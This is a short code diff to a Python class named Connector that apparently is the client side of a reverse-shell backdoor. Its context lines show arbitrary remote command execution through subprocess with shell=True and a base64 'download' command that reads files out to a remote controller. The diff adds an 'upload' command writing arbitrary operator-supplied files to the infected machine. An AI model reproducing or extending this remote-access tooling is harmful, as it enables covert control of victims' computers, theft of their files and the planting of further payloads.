@@ -27,6 +27,11 @@ class Connector:
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful."
+
     def run(self):
         while True:
             print("ON")
@@ -38,6 +43,8 @@ class Connector:
                 command_result = self.change_working_directory_to(command[1])
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+            elif command[0] == "upload":
+                command_result = self.write_file(command[1], command[2])
             else:
                 command_result = subprocess.check_output(command, shell=True)
             self.reliable_send(command_result)
